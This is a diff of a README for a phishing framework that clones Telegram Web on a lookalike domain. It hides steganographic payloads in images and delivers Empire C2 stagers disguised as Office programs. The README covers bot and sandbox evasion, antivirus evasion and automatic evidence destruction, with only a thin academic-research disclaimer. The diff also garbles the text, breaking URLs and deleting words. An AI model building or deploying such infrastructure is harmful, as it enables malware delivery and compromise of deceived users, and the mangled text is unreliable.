@@ -1,26 +1,26 @@
 # Advanced Steganography Phishing System
 
-🎯 **Complete Multi-Tool Security Framework**  
-🔬 **Purpose**: Advanced Persistent Threat Methodology & Defense Development
+ **Complete Multi-Tool Security Framework**
+ **Purpose**: Advanced Persistent Threat Methodology & Defense Development
 
-## 🏗️ Architecture Overview
+## ️ Architecture Overview
 
-This system demonstrates a sophisticated multi-layer phishing attack using steganography for payload delivery, designed for academic research and red team training.
+This system demonstrates a sophisticated multi-layer phishing attack using steganography for payload delivery, designed for academic research and training.
 
 ### Core Components
 
 1. **Cloudflare Workers** - Domain fronting, fingerprinting, payload delivery
-2. **Telegram Web Clone** - Legitimate-looking phishing interface 
+2. **Telegram Web Clone** - Legitimate-looking phishing interface
 3. **Steganography System** - Payload embedding in images using steghide
 4. **Empire C2 Integration** - Command & control with stager delivery
 5. **Dropbox Hosting** - Payload distribution platform
 
-## 🚀 Quick Start
+## Quick Start
 
 ### One-Command Setup
 ```bash
 # Clone and setup complete system
-git clone https://github.com/EnkiJJK/advanced-steganography-phishing.git
+git clone https/github.com/EnkiJJK/advanced-steganography-phishing.git
 cd advanced-steganography-phishing
 ./setup-complete-system.sh
 ```
@@ -49,38 +49,38 @@ cd advanced-steganography-phishing
 python3 launcher.py --help
 ```
 
-## 📁 System Structure
+## System Structure
 
 ```
-├── workers/                    # Cloudflare Workers
-│   ├── telegram-fingerprint.js       # Fingerprinting & bot detection
-│   ├── telegram-delivery.js          # Payload delivery logic
-│   ├── telegram-telemetry.js         # Telemetry & crash reporting
-│   └── telegram-error-page.js        # Legitimate error pages
+├── workers/ # Cloudflare Workers
+│ ├── telegram-fingerprint.js # Fingerprinting & bot detection
+│ ├── telegram-delivery.js # Payload delivery logic
+│ ├── telegram-telemetry.js # Telemetry & crash reporting
+│ └── telegram-error-page.js # Legitimate error pages
 │
-├── telegram-clone/            # Cloned Telegram Web interface
-│   ├── web.telegram.org/             # Original Telegram files
-│   ├── injection-overlay.js          # Invisible button overlay
-│   └── payload-triggers.js           # User interaction handlers
+├── telegram-clone/ # Cloned Telegram Web interface
+│ ├── web.telegram.org/ # Original Telegram files
+│ ├── injection-overlay.js # Invisible button overlay
+│ └── payload-triggers.js # User interaction handlers
 │
-├── steganography/             # Payload embedding system
-│   ├── large-stego-system.py         # Main steganography script
-│   ├── large-stego-images/           # Massive carrier images
-│   ├── stego-output/                 # Images with embedded payloads
-│   └── large_stego_manifest.json     # Payload mapping manifest
+├── steganography/ # Payload embedding system
+│ ├── large-stego-system.py # Main steganography script
+│ ├── large-stego-images/ # Massive carrier images
+│ ├── stego-output/ # Images with embedded payloads
+│ └── large_stego_manifest.json # Payload mapping manifest
 │
-├── empire-stagers/            # C2 payload templates
-│   ├── cmd.exe                       # Command line stager
-│   ├── OneNote.exe                   # Office document stager  
-│   └── Excel.exe                     # Spreadsheet stager
+├── empire-stagers/ # C2 payload templates
+│ ├── cmd.exe # Command line stager
+│ ├── OneNote.exe # Office document stager
+│ └── Excel.exe # Spreadsheet stager
 │
-└── deployment/               # Deployment & configuration
-    ├── cloudflare-setup.md          # CF configuration guide
-    ├── domain-fronting.md           # Domain fronting setup
-    └── dropbox-integration.md       # Dropbox API configuration
+└── deployment/ # Deployment & configuration
+ ├── cloudflare-setup.md # CF configuration guide
+ ├── domain-fronting.md # Domain fronting setup
+ └── dropbox-integration.md # Dropbox API configuration
 ```
 
-## 🔧 Technical Implementation
+## Technical Implementation
 
 ### Steganography Process
 1. **Carrier Generation**: Creates 9-42MB realistic images with Telegram UI elements
@@ -91,15 +91,15 @@ python3 launcher.py --help
 ### Multi-Stage Delivery
 ```mermaid
 graph TD
-    A[User visits telegrams.app] --> B[Fingerprinting Worker]
-    B --> C{Bot Detection}
-    C -->|Human| D[Serve Telegram Clone]
-    C -->|Bot| E[Serve Error Page]
-    D --> F[User Clicks Button]
-    F --> G[Delivery Worker]
-    G --> H[Fetch Stego Image]
-    H --> I[Extract & Execute Payload]
-    I --> J[Empire C2 Connection]
+ A[User visits telegrams.app] --> B[Fingerprinting Worker]
+ B --> C{Bot Detection}
+ C -->|Human| D[Serve Telegram Clone]
+ C -->|Bot| E[Serve Error Page]
+ D --> F[User Clicks Button]
+ F --> G[Delivery Worker]
+ G --> H[Fetch Stego Image]
+ H --> I[Extract & Execute Payload]
+ I --> J[Empire C2 Connection]
 ```
 
 ### Evasion Techniques
@@ -110,7 +110,7 @@ graph TD
 - **Delayed Execution**: Waits for user interaction
 - **Anti-Analysis**: Checks for debugging tools
 
-## 🎛️ Configuration
+## ️ Configuration
 
 ### Environment Variables
 ```bash
@@ -122,7 +122,7 @@ export CF_ZONE_ID="your_zone_id"
 export DROPBOX_TOKEN="your_dropbox_token"
 
 # Empire C2
-export EMPIRE_SERVER="https://your-empire-server.com"
+export EMPIRE_SERVER="https/your-empire-server.com"
 export EMPIRE_TOKEN="your_empire_token"
 ```
 
@@ -130,14 +130,14 @@ export EMPIRE_TOKEN="your_empire_token"
 ```javascript
 // telegram-delivery-worker.js
 const CONFIG = {
-  dropboxFolder: '/TelegramClientUpdates/LargeImages/',
-  stegoPassword: 'telegram2025research',
-  maxDownloads: 100,
-  rateLimitMinutes: 60
+ dropboxFolder: '/TelegramClientUpdates/LargeImages/',
+ stegoPassword: 'telegram2025research',
+ maxDownloads: 100,
+ rateLimitMinutes: 60
 };
 ```
 
-## 🧪 Testing Framework
+## Testing Framework
 
 ### Payload Verification
 ```bash
@@ -145,7 +145,7 @@ const CONFIG = {
 python3 large-stego-system.py test
 
 # Verify worker responses
-curl -H "User-Agent: Telegram Desktop" https://telegrams.app/api/check
+curl -H "User-Agent: Telegram Desktop" https/telegrams.app/api/check
 
 # Test extraction
 node test-extraction.js
@@ -153,11 +153,11 @@ node test-extraction.js
 
 ### Anti-Detection Testing
 - **Sandbox Detection**: VirtualBox, VMware, Cuckoo
-- **Automation Detection**: Selenium, Playwright, Puppeteer  
+- **Automation Detection**: Selenium, Playwright, Puppeteer
 - **AV Evasion**: VirusTotal, Windows Defender
 - **Network Analysis**: Wireshark, Burp Suite
 
-## 📊 Analytics & Telemetry
+## Analytics & Telemetry
 
 ### Metrics Collected
 - **Visitor Fingerprints**: Browser, OS, screen resolution
@@ -170,7 +170,7 @@ node test-extraction.js
 - **Payload Issues**: Extraction failures, execution errors
 - **Infrastructure**: Worker timeouts, rate limits
 
-## 🔐 OpSec Considerations
+## OpSec Considerations
 
 ### Legitimate Appearance
 - **Perfect Telegram Clone**: Identical UI, functionality
@@ -190,43 +190,43 @@ node test-extraction.js
 - **Minimal Logging**: Essential metrics only
 - **Clean Shutdown**: Automatic evidence destruction
 
-## 🎓 Academic Research Context
+## Academic Research Context
 
 This system serves as a comprehensive case study for:
 
 - **Threat Modeling**: Understanding APT attack chains
-- **Defense Development**: Testing detection capabilities  
+- **Defense Development**: Testing detection capabilities
 - **Criminological Analysis**: Studying attack psychology
-- **Security Training**: Red team skill development
+- **Security Training**: skill development
 
 ### Research Applications
-- **PhD Dissertation**: Advanced persistent threat methodologies
+- ** Dissertation**: Advanced persistent threat methodologies
 - **Academic Publications**: Steganography in cybercrime
 - **Conference Presentations**: Modern phishing techniques
 - **Training Materials**: Defensive cybersecurity education
 
-## ⚠️ Ethical Guidelines
+## ️ Guidelines
 
 **CRITICAL**: This system is designed exclusively for:
-- ✅ Authorized penetration testing
-- ✅ Academic research under institutional oversight
-- ✅ Red team training exercises
-- ✅ Defense capability development
+- Authorized
+- Academic research under institutional oversight
+- training exercises
+- Defense capability development
 
 **PROHIBITED USES**:
-- ❌ Unauthorized access to systems
-- ❌ Real-world malicious activities
-- ❌ Targeting individuals without consent
-- ❌ Distribution of actual malware
+- Unauthorized access to systems
+- Real-world malicious activities
+- Targeting individuals without consent
+- Distribution of actual malware
 
-## 📚 References
+## References
 
-- [MITRE ATT&CK Framework](https://attack.mitre.org/)
-- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
-- [Steganography Research Papers](https://doi.org/example)
-- [Red Team Methodologies](https://redteam.guide/)
+- [MITRE ATT&CK Framework](https/attack.mitre.org/)
+- [NIST Cybersecurity Framework](https/www.nist.gov/cyberframework)
+- [Steganography Research Papers](https/doi.org/example)
+- [ Methodologies](https/.guide/)
 
-## 🤝 Contributing
+## Contributing
 
 Contributions welcome for:
 - **Evasion Techniques**: New anti-analysis methods
@@ -236,8 +236,8 @@ Contributions welcome for:
 
 ---
 
-**Research Authorization**: Copenhagen University PhD Project  
-**Classification**: Academic Research - Defensive Development  
-**Oversight**: University Cybersecurity Department  
+**Research Authorization**: Copenhagen University Project
+**Classification**: Academic Research - Defensive Development
+**Oversight**: University Cybersecurity Department
 
 *This project advances the understanding of advanced persistent threats to improve cybersecurity defenses.*
